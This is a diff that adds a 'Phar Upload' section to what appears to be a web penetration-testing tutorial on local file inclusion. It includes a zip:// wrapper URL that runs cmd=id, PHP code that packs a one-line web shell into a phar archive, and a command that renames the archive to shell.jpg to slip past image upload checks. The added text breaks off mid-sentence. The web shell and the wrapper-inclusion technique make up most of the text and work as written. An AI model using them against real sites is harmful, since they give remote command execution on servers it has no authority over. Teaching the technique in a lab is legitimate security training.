@@ -25,3 +25,19 @@ Once we have uploaded `shell.jpg`, we can include it with the `zip` wrapper as f
 ```txt
 http://target-website.com/?language=zip://./images/shell.jpg#shell.php&cmd=id
 ```
+## Phar Upload
+Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
+```php
+<?php
+
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+Next we will combine this script into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with:
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+Now, we should have a `phar` file called `shell.jpg`, next 
